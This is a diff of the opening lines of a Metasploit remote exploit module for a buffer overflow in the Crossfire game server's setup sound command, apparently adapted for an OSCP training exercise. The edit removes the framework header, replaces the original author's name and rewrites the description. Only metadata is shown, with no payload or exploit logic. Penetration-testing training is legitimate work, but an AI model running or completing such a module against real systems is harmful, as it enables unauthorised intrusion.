@@ -1,23 +1,15 @@
-##
-# This module requires Metasploit: http://metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
-##
-
-
 require 'msf/core'
-
 
   class Metasploit3 < Msf::Exploit::Remote
   Rank = GoodRanking
-
   include Msf::Exploit::Remote::Tcp
 
-  def initialize(info = {})
+def initialize(info = {})
     super(update_info(info,
-      'Name'		=> 'Crossfire SetUp() Remote Buffer Overflow',
+      'Name'		=> 'Crossfire set sound B0f module',
       'Description'	=> %q{
-        This module exploits a buffer overflow in the setup sound command of crossfire.},
-      'Author'	=> [ 'pelesmk' ],
+        Required for OSCP exercise.},
+      'Author'	=> [ 'AXANO' ],
       'Arch'		=> ARCH_X86,
       'Platform'	=> 'linux',
       'References'	=>
